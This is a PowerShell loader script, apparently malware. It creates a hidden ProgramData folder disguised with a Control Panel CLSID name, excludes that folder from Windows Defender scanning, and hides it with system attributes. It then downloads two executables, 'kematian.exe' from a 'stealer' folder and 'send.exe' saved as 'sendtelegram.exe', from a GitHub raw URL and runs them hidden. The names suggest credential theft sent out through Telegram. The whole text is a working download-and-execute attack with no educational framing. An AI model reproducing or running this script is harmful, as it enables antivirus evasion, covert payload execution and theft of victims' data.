
$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$stealer = "$dir\stealer"
New-Item -ItemType Directory -Path $stealer
cd $stealer

$url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/kematian.exe"
$output = "$dir\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}

Start-Process $output -WindowStyle Hidden -Wait

$url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/send.exe"
$output = "$dir\sendtelegram.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}

Start-Process $output -WindowStyle Hidden -Wait
